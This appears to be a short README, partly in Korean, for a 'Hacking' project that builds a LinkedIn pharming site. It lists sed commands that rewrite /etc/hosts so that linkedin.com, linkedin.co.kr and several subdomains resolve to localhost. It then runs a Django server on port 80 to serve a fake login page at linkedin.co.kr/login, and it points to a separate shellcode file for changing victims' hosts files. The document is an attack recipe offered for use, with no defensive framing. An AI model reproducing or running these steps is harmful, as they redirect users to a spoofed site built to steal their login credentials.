# Hacking
## Requirement
1. django 설치
2. python 설치

## DNS Fishing Code
```
sudo vi /etc/hosts
sudo sed -i '1i127.0.0.1 linkedin.co.kr' /etc/hosts
sudo sed -i '1i127.0.0.1 linkedin.com' /etc/hosts
sudo sed -i '1i127.0.0.1 www.linkedin.com' /etc/hosts
sudo sed -i '1i127.0.0.1 www.linkedin.co.kr' /etc/hosts
sudo sed -i '1i127.0.0.1 kr.linkedin.co.kr' /etc/hosts
```

## Pharming WebSite Execution
```
cd ${Clone Path}
python manage.py runserver 127.0.0.1:80
```

## Modifiy host file
Refer to ./shellcode/README file


## Access Link
linkedin.co.kr/login

